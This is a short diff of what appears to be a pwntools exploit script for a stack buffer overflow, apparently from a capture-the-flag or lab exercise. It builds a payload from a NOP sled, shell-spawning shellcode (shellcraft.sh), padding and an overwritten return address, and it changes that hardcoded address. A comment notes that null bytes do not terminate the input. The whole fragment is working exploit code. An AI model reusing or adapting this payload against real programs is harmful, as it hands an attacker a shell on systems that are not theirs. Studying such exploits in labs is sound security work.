@@ -36,7 +36,8 @@ numOfPads = 1352
 payload = b"\x90" * (8*50) # NOP_SLED 1
 payload += shellcode # asm(shellcraft.sh())
 payload += b"\x90" * (numOfPads - len(payload))
-payload += p64(0x7fffffffdab0) # b"F" * 6 + b"\x00\x00"
+# payload += p64(0x7fffffffdab0) # b"F" * 6 + b"\x00\x00"
+payload += p64(0x7fffffffe100) # b"F" * 6 + b"\x00\x00"
 
 # Checking the stack, it seems that the `EEEE` is being written suggesting that \x00 might not terminate the input.
 payload += b"EEEE"
